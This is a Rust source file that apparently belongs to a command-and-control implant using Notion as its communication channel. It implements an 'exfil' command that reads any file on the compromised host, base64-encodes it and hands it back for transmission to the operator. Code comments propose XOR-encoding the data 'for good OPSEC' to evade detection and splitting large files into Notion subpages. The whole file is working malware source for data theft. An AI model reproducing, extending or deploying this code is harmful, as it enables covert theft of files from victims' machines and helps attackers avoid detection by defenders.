use litcrypt::lc;
use std::error::Error;
use std::fs::File;
use base64::encode;
use std::io::Read;
use std::str;

use crate::cmd::{CommandArgs, notion_out};
use crate::config::ConfigOptions;
use crate::logger::{Logger};



pub async fn handle(cmd_args: &mut CommandArgs, config_options: &mut ConfigOptions, logger: &Logger) -> Result<String, Box<dyn Error>> {

    let args: Vec<String> = cmd_args.collect();
    if args.len() != 1 {
        return notion_out!("[-] Exfil takes one argument. Example: exfil [path] 🎯");
    }

    else {
    // path to file to exfiltrate
    let path = &args[0];
    let mut buffer = Vec::new();
    let mut f = match File::open(path) {
        Ok(f) => f,
        Err(e) => {
            return notion_out!("[-] File does not exist");
        }
    };
    f.read_to_end(&mut buffer)?;
    // base64 encode it
    let b64_enc = base64::encode(&buffer);
    // send it off!
    
    // TODO:
    // opportunity here to XOR these bytes with a predetermined key for good OPSEC

    
    // TODO:
    // roughly, base64 encoded data is 1.37 times the size of the original
    // 2MB of b64 encoded data is 2,000,000 bytes give or take
    // So if the base64 encoded data is longer than 2,740,000, this is a larger file
    // If it's a larger file, make a new subpage in Notion and add the b64 encoded data without landing it into a code block
    
    Ok(b64_enc)
    }
}


